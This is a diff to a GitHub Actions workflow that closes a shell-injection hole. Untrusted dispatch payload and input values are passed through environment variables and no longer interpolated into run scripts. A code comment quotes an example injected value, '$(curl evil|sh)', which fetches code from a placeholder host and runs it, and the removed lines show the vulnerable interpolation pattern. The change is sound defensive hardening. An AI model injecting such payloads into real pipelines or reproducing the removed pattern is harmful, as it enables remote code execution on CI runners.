@@ -70,23 +70,43 @@ jobs:
 
       - name: Resolve dispatch payload
         id: payload
+        # Untrusted dispatch/input values are passed through env, NOT interpolated
+        # into the script body — otherwise a crafted payload (e.g. service =
+        # "$(curl evil|sh)") would execute as shell. Referencing them as "$VAR"
+        # treats them as inert data.
+        env:
+          EVENT_NAME: ${{ github.event_name }}
+          CP_SERVICE: ${{ github.event.client_payload.service }}
+          CP_PR_NUMBER: ${{ github.event.client_payload.pr_number }}
+          CP_HEAD_SHA: ${{ github.event.client_payload.head_sha }}
+          CP_ORIGINATING_REPO: ${{ github.event.client_payload.originating_repo }}
+          CP_QA_PLAN_COMMENT_ID: ${{ github.event.client_payload.qa_plan_comment_id }}
+          CP_PLAN_CASES: ${{ github.event.client_payload.plan_cases }}
+          CP_LINKED_PRS: ${{ github.event.client_payload.linked_prs }}
+          IN_SERVICE: ${{ inputs.service }}
+          IN_PR_NUMBER: ${{ inputs.pr_number }}
+          IN_HEAD_SHA: ${{ inputs.head_sha }}
+          IN_ORIGINATING_REPO: ${{ inputs.originating_repo }}
+          IN_QA_PLAN_COMMENT_ID: ${{ inputs.qa_plan_comment_id }}
+          IN_PLAN_CASES: ${{ inputs.plan_cases }}
+          IN_LINKED_PRS: ${{ inputs.linked_prs }}
         run: |
-          if [[ "${{ github.event_name }}" == "repository_dispatch" ]]; then
-            SERVICE="${{ github.event.client_payload.service }}"
-            PR_NUMBER="${{ github.event.client_payload.pr_number }}"
-            HEAD_SHA="${{ github.event.client_payload.head_sha }}"
-            ORIGINATING_REPO="${{ github.event.client_payload.originating_repo }}"
-            QA_PLAN_COMMENT_ID="${{ github.event.client_payload.qa_plan_comment_id }}"
-            PLAN_CASES="${{ github.event.client_payload.plan_cases }}"
-            LINKED_PRS='${{ github.event.client_payload.linked_prs }}'
+          if [[ "$EVENT_NAME" == "repository_dispatch" ]]; then
+            SERVICE="$CP_SERVICE"
+            PR_NUMBER="$CP_PR_NUMBER"
+            HEAD_SHA="$CP_HEAD_SHA"
+            ORIGINATING_REPO="$CP_ORIGINATING_REPO"
+            QA_PLAN_COMMENT_ID="$CP_QA_PLAN_COMMENT_ID"
+            PLAN_CASES="$CP_PLAN_CASES"
+            LINKED_PRS="$CP_LINKED_PRS"
           else
-            SERVICE="${{ inputs.service }}"
-            PR_NUMBER="${{ inputs.pr_number }}"
-            HEAD_SHA="${{ inputs.head_sha }}"
-            ORIGINATING_REPO="${{ inputs.originating_repo }}"
-            QA_PLAN_COMMENT_ID="${{ inputs.qa_plan_comment_id }}"
-            PLAN_CASES="${{ inputs.plan_cases }}"
-            LINKED_PRS='${{ inputs.linked_prs }}'
+            SERVICE="$IN_SERVICE"
+            PR_NUMBER="$IN_PR_NUMBER"
+            HEAD_SHA="$IN_HEAD_SHA"
+            ORIGINATING_REPO="$IN_ORIGINATING_REPO"
+            QA_PLAN_COMMENT_ID="$IN_QA_PLAN_COMMENT_ID"
+            PLAN_CASES="$IN_PLAN_CASES"
+            LINKED_PRS="$IN_LINKED_PRS"
           fi
           if [[ -z "$PLAN_CASES" ]]; then
             PLAN_CASES="CASE-001,CASE-002,CASE-003,CASE-101,CASE-102,CASE-103,CASE-104,CASE-201,CASE-202,CASE-203,CASE-204,CASE-205,CASE-206,CASE-207,CASE-208,CASE-209,CASE-210,CASE-211,CASE-212,CASE-213,CASE-214,CASE-215,CASE-216,CASE-217,CASE-218,CASE-219,CASE-220,CASE-221,CASE-222,CASE-223,CASE-224,CASE-225,CASE-226,CASE-227,CASE-228,CASE-229,CASE-230,CASE-231"
@@ -340,6 +360,10 @@ jobs:
 
       - name: Parse results into JSON
         if: always()
+        # plan_cases derives from the untrusted dispatch payload — pass via env so
+        # it can't break out of the shell (github.* contexts here are trusted).
+        env:
+          PLAN_CASES: ${{ steps.payload.outputs.plan_cases }}
         run: |
           RUN_URL="${{ github.server_url }}/${{ github.repository }}/actions/runs/${{ github.run_id }}"
           if [[ ! -f results.xml ]]; then
@@ -348,7 +372,7 @@ jobs:
             echo '<?xml version="1.0"?><testsuites/>' > results.xml
           fi
           python tools/parse_junit.py results.xml \
-            --plan-cases "${{ steps.payload.outputs.plan_cases }}" \
+            --plan-cases "$PLAN_CASES" \
             --run-url "$RUN_URL" \
             --output results.json
           cat results.json
